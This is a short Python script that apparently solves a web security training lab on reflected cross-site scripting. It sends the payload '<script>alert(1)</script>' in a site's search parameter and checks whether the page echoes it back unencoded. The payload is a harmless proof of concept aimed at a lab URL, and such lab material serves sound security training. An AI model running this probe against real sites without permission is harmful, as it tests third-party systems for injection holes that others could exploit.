#!/usr/bin/env python3

# Lab: Reflected XSS into HTML context with nothing encoded
# Steps:
# 1. Send the XSS payload in the search parameter.
# 2. Check whether the HTML response reflects the payload unchanged.
# Usage: python3 reflected_xss_into_html_context_with_nothing_encoded.py https://LAB-URL/

import sys

import requests


if len(sys.argv) != 2:
    raise SystemExit(f"Usage: python3 {sys.argv[0]} https://LAB-URL/")

lab_url = sys.argv[1]
payload = "<script>alert(1)</script>"

try:
    response = requests.get(lab_url, params={"search": payload}, timeout=10)
    response.raise_for_status()
except requests.RequestException as exc:
    raise SystemExit(f"[-] HTTP request failed: {exc}") from exc

print(f"Request URL: {response.url}")

position = response.text.find(payload)
if position == -1:
    raise SystemExit("[-] Payload was not found unchanged in the HTML response")

start = max(0, position - 80)
end = position + len(payload) + 80
print(f"Reflected response excerpt: {response.text[start:end]}")
print("[+] Confirmed unchanged reflection in the HTML response")
